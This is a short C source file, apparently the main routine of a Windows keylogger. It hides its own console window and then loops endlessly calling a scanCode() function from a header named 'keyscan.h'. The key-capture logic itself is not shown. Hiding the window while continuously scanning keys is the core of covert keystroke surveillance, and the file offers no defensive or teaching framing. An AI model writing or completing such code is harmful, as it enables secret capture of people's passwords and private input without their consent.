#include <stdio.h>
#include <stdlib.h>

#include "keyscan.h"

int main(int argc, char **argv){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while(TRUE){
        scanCode();
    }
    return 0;
}
